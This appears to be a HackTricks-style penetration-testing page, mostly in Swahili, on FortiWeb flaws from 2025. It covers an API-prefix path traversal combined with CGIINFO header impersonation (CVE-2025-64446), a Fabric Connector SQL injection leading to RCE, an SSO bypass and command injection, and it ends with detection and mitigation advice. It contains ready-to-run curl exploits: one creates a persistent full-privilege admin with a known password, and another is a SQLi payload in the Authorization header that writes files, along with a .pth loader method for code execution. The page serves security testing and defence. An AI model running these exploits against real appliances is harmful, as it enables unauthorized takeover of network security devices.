# Fortinet FortiWeb — Auth bypass via API-prefix traversal and CGIINFO impersonation

{{#include ../../banners/hacktricks-training.md}}

## Muhtasari

Fortinet FortiWeb inatoa centralized CGI dispatcher katika `/cgi-bin/fwbcgi`. Mnyororo wa bug mbili unamruhusu mshambuliaji wa mbali asiyethibitishwa kufanya:
- Kufikia `fwbcgi` kwa kuanza URL na API prefix halali na kupita directories.
- Kujifanya mtumiaji yeyote (ikiwa ni pamoja na aliyejengwa ndani `admin`) kwa kutoa HTTP header maalum ambayo CGI inaamini kama kitambulisho.

Ushauri wa muuzaji: FG‑IR‑25‑910 (CVE‑2025‑64446). Matumizi yake yameonekana kwa vitendo kuunda watumiaji wa admin wa kudumu.

Matoleo yaliyoathiriwa (kama ilivyoelezwa hadharani):
- 8.0 < 8.0.2
- 7.6 < 7.6.5
- 7.4 < 7.4.10
- 7.2 < 7.2.12
- 7.0 < 7.0.12
- 6.4 ≤ 6.4.3
- 6.3 ≤ 6.3.23

FortiWeb 8.0.2 inarudisha HTTP 403 kwa traversal probe hapa chini.

## Jaribio mfupi la udhaifu

- Path traversal from API prefix to `fwbcgi`:
```http
GET /api/v2.0/cmdb/system/admin/../../../../../cgi-bin/fwbcgi HTTP/1.1
Host: <target>
```
- Ufafanuzi: HTTP 200 → ina uwezekano wa kuwa dhaifu; HTTP 403 → imerekebishwa.

## Mnyororo wa chanzo msingi

1) API-prefix path traversal to internal CGI
- Njia yoyote ya ombi ambayo inaanza na kiambishi sahihi cha FortiWeb API (e.g., `/api/v2.0/cmdb/` or `/api/v2.0/cmd/`) inaweza kupita kwa `../` hadi `/cgi-bin/fwbcgi`.

2) Minimal-body validation bypass
- Mara `fwbcgi` inapofikiwa, kizuizi cha kwanza hufanya ukaguzi mwepesi wa JSON unaotegemea faili ya kila-nyaya chini ya `/var/log/inputcheck/`. Ikiwa faili haipo, ukaguzi unapita mara moja. Ikiwa ipo, mwili unahitaji tu kuwa JSON halali. Tumia `{}` kama mwili mdogo unaokubalika.

3) Header-driven user impersonation
- Programu husoma variable ya mazingira ya CGI `HTTP_CGIINFO` (inayotokana na kichwa cha HTTP `CGIINFO`), inaifanya Base64-decode, inachanganua JSON, na kunakili sifa moja kwa moja katika muktadha wa kuingia, ikiweka domain/VDOM. Vifunguo vinavyovutia:
- `username`, `loginname`, `vdom`, `profname`
- Mfano wa JSON ya kuiga admin iliyojengwa ndani:
```json
{
"username": "admin",
"profname": "prof_admin",
"vdom": "root",
"loginname": "admin"
}
```
Base64 ya hapo juu (kama inavyotumika katika mazingira halisi):
```
eyJ1c2VybmFtZSI6ICJhZG1pbiIsICJwcm9mbmFtZSI6ICJwcm9mX2FkbWluIiwgInZkb20iOiAicm9vdCIsICJsb2dpbm5hbWUiOiAiYWRtaW4ifQ==
```
## Mfano wa matumizi mabaya kutoka mwanzoni hadi mwisho (unauthenticated → admin)

1) Fikia `/cgi-bin/fwbcgi` kupitia API-prefix traversal.
2) Toa mwili wa JSON yoyote halali (mfano, `{}`) ili kukidhi ukaguzi wa ingizo.
3) Tuma header `CGIINFO: <base64(json)>` ambapo JSON inaelezea utambulisho wa lengo.
4) POST JSON ya backend inayotarajiwa na `fwbcgi` ili kutekeleza vitendo zenye ruhusa za juu (mfano, unda mtumiaji admin kwa kudumu).

### Minimal cURL PoC

- Probe traversal exposure:
```bash
curl -ik 'https://<host>/api/v2.0/cmdb/system/admin/../../../../../cgi-bin/fwbcgi'
```
- Jifanya admin na unda local admin user mpya:
```bash
# Base64(JSON) for admin impersonation
B64='eyJ1c2VybmFtZSI6ICJhZG1pbiIsICJwcm9mbmFtZSI6ICJwcm9mX2FkbWluIiwgInZkb20iOiAicm9vdCIsICJsb2dpbm5hbWUiOiAiYWRtaW4ifQ=='

curl -ik \
-H "CGIINFO: $B64" \
-H 'Content-Type: application/json' \
-X POST \
--data '{"data":{"name":"watchTowr","access-profile":"prof_admin","access-profile_val":"0","trusthostv4":"0.0.0.0/0","trusthostv6":"::/0","type":"local-user","type_val":"0","password":"P@ssw0rd!"}}' \
'https://<host>/api/v2.0/cmdb/system/admin/../../../../../cgi-bin/fwbcgi'
```
Notes:
- Mwili wowote wa JSON halali unatosha (mfano, `{}`) ikiwa `/var/log/inputcheck/<path>.json` haipo.
- Skema ya action ni FortiWeb-internal; mfano hapo juu unaongeza local admin mwenye vibali kamili.

## Udhaifu mwingine wa FortiWeb 2025 unaostahili kukaguliwa haraka

### Pre-auth Fabric Connector SQLi → RCE (CVE-2025-25257)
- Inaathiri 7.6.0–7.6.3, 7.4.0–7.4.7, 7.2.0–7.2.10, 7.0.0–7.0.10. Imerekebishwa katika 7.6.4 / 7.4.8 / 7.2.11 / 7.0.11.
- Bug: `get_fabric_user_by_token()` inatumia thamani ya `Authorization: Bearer <token>` moja kwa moja katika query ya SQL. Mshambulizi anaweza kutoa SQL inayotekelezwa kama mtumiaji wa MySQL na inaweza kuandika faili kwa kutumia `SELECT ... INTO OUTFILE`, ikileta utekelezaji wa msimbo (webshell/`.pth` loader).
- Uso wa kawaida wa shambulio: `/api/fabric/device/status` (na endpoints nyingine za Fabric Connector) kupitia HTTP/HTTPS kwenye management plane.
- Mtihani wa haraka kwa SQLi:
```bash
curl -sk -X POST \
-H "Authorization: Bearer ' UNION SELECT NULL,NULL,NULL,NULL INTO OUTFILE '/data/var/tmp/pwn.txt' -- -" \
https://<host>/api/fabric/device/status
```
- Weaponization: andika `.pth` ndani ya FortiWeb's Python site-packages ambayo inafanya import `os;os.system(...)` wakati interpreter inapoanzishwa, au weka CGI chini ya webroot. Kuanzisha upya huduma kutatekeleza payload.
- Hunting clues: Authorization headers containing quotes/UNION/SELECT; unexpected files under `/data/lib/python*/site-packages/` or `/data/var/waf/html/ROOT/cgi-bin/`.

### FortiCloud SSO signature bypass (CVE-2025-59719)
- Improper SAML signature verification lets an attacker forge FortiCloud SSO responses and log in as admin with no credentials.
- Only exploitable when **FortiCloud SSO login** is enabled (it turns on automatically if the appliance was registered via GUI unless the checkbox was unticked).
- Affected (per PSIRT): 8.0.0, 7.6.0–7.6.4, 7.4.0–7.4.9. Patched in 8.0.1 / 7.6.5 / 7.4.10.

### OS command injection in management plane (CVE-2025-58034)
- Affected: 7.0.0–7.0.11, 7.2.0–7.2.11, 7.4.0–7.4.10, 7.6.0–7.6.5, 8.0.0–8.0.1. Fixed in 7.0.12 / 7.2.12 / 7.4.11 / 7.6.6 / 8.0.2.
- Practical probe (non-destructive): tuma parameter iliyo na ``;id;`` kwa management HTTP endpoints na angalia majibu ya 500 yenye output ya command; zuia au patch mara moja ukiona echo yoyote.

## Utambuzi

- Maombi yanayofika `/cgi-bin/fwbcgi` kupitia API-prefix paths zenye `../` (kwa mfano, `/api/v2.0/cmdb/.../../../../../../cgi-bin/fwbcgi`).
- Uwepo wa header `CGIINFO` yenye Base64 JSON iliyo na funguo `username`/`loginname`/`vdom`/`profname`.
- Fabric Connector SQLi: Authorization headers containing SQL metacharacters, mafaili yasiyotegemewa kwenye Python site-packages/CGI dirs, hits to `/api/fabric/device/status` kutoka IP za internet.
- FortiCloud SSO: SAML issuers au audience values zisizotarajiwa ndani ya `/var/log/ssod`.
- Backend artifacts:
- Mafaili kwa njia fulani chini ya `/var/log/inputcheck/` (gate configuration).
- Uundaji wa admin usiotarajiwa na mabadiliko ya configuration.
- Uthibitisho wa haraka: jaribio la traversal kurudisha 200 (imefunuliwa) vs 403 (imezuiwa kwenye builds zilizorekebishwa).

## Kupunguza hatari

- Sasisha kwenye releases zilizosahihishwa (mfano: 8.0.2, 7.6.5, 7.4.10, 7.2.12, 7.0.12) kulingana na vendor advisory.
- Patch zingine flaws za 2025: SQLi (7.6.4/7.4.8/7.2.11/7.0.11), SSO bypass (8.0.1/7.6.5/7.4.10), command injection (7.6.6/7.4.11/7.2.12/7.0.12/8.0.2).
- Hadi zitakaporekebishwa:
- Usifungue management plane ya FortiWeb kwa mitandao isiyoaminika.
- Ongeza reverse-proxy/WAF rules kuzuia:
- Paths ambazo zinaanza na `/api/` na zenye `../cgi-bin/fwbcgi`.
- Maombi yanayoleta header `CGIINFO`.
- Fabric Connector calls with SQL metacharacters katika `Authorization`.
- SAML endpoints kutoka internet ikiwa FortiCloud SSO haijatumika.
- Fuatilia na toa alarms kwa viashiria vya utambuzi vilivyo hapo juu.

## References

- [When the impersonation function gets used to impersonate users — Fortinet FortiWeb auth bypass (watchTowr Labs)](https://labs.watchtowr.com/when-the-impersonation-function-gets-used-to-impersonate-users-fortinet-fortiweb-auth-bypass/)
- [watchTowr vs FortiWeb Auth Bypass — Detection artefact generator](https://github.com/watchtowrlabs/watchTowr-vs-Fortiweb-AuthBypass)
- [CVE-2025-25257 — Fabric Connector pre-auth SQLi PoC](https://github.com/mrmtwoj/CVE-2025-25257)
- [FortiCloud SSO signature bypass overview (CVE-2025-59719)](https://cyberpress.org/fortios-fortiweb-fortiproxy-flaw-allows-attackers-to-bypass-forticloud-sso/)

{{#include ../../banners/hacktricks-training.md}}
